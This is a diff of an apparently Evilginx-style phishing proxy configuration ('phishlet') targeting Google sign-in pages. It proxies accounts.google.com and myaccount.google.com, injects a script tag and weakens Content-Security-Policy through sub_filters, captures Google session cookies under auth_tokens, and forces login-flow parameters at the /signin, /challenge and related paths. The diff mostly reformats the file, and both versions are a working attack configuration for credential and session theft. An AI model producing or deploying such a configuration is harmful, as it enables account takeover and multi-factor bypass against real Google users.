@@ -2,55 +2,15 @@ author: '@Evi1Grey5'
 min_ver: '3.0.0'
 
 proxy_hosts:
-  - phish_sub: 'accounts'
-    orig_sub: 'accounts'
-    domain: 'google.com'
-    session: true
-    is_landing: true
-    auto_filter: false
-    headers: 
-      Access-Control-Allow-Origin: '*'
-      Access-Control-Allow-Methods: 'GET, POST, OPTIONS'
-      Access-Control-Allow-Headers: 'Content-Type, Authorization'
-      Access-Control-Allow-Credentials: 'true'
-  - phish_sub: 'myaccount'
-    orig_sub: 'myaccount'
-    domain: 'google.com'
-    session: true
-    is_landing: false
-    auto_filter: true
-  - phish_sub: ''
-    orig_sub: ''
-    domain: 'google.com'
-    session: true
-    is_landing: false
-    auto_filter: false
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
 
 sub_filters:
-  - triggers_on: 'accounts.google.com'
-    orig_sub: 'accounts'
-    domain: 'google.com'
-    search: '</head>'
-    replace: '<script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script><meta http-equiv="Content-Security-Policy" content="default-src * \"unsafe-inline\" \"unsafe-eval\" *; connect-src *"></head>'
-    mimes: ['text/html']
-  - triggers_on: 'accounts.google.com'
-    orig_sub: 'accounts'
-    domain: 'google.com'
-    search: 'OPTIONS'
-    replace: "HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Headers: Content-Type, Authorization\n\n"
-    mimes: ['application/json']
-  - triggers_on: 'myaccount.google.com'
-    orig_sub: 'myaccount'
-    domain: 'google.com'
-    search: '{hostname}'
-    replace: '{hostname}'
-    mimes: ['text/html']
-  - triggers_on: 'accounts.google.com'
-    orig_sub: 'accounts'
-    domain: 'google.com'
-    search: 'Content-Security-Policy'
-    replace: "default-src * 'unsafe-inline' 'unsafe-eval';"
-    mimes: ['text/html']
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '</head>', replace: '<script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script></head>', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Content-Security-Policy', replace: "default-src * 'unsafe-inline' 'unsafe-eval';", mimes: ['text/html']}
 
 auth_tokens:
   - domain: '.google.com'
@@ -77,46 +37,34 @@ credentials:
 force_post:
   - path: '/selectchallenge'
     search:
-      - key: 'flowEntry'
-        search: '.*'
-      - key: 'flowName'
-        search: '.*'
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
     force:
-      - key: 'continue'
-        value: 'https://accounts.google.com/ManageAccount?nc=1'
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
     type: 'post'
 
   - path: '/signin'
     search:
-      - key: 'flowEntry'
-        search: '.*'
-      - key: 'flowName'
-        search: '.*'
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
     force:
-      - key: 'continue'
-        value: 'https://accounts.google.com/ManageAccount?nc=1'
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
     type: 'post'
 
   - path: '/speedbump'
     search:
-      - key: 'flowEntry'
-        search: '.*'
-      - key: 'flowName'
-        search: '.*'
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
     force:
-      - key: 'continue'
-        value: 'https://accounts.google.com/ManageAccount?nc=1'
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
     type: 'post'
 
   - path: '/challenge'
     search:
-      - key: 'flowEntry'
-        search: '.*'
-      - key: 'flowName'
-        search: '.*'
+      - {key: 'flowEntry', search: '.*'}
+      - {key: 'flowName', search: '.*'}
     force:
-      - key: 'continue'
-        value: 'https://accounts.google.com/ManageAccount?nc=1'
+      - {key: 'continue', value: 'https://accounts.google.com/ManageAccount?nc=1'}
     type: 'post'
 
 login:
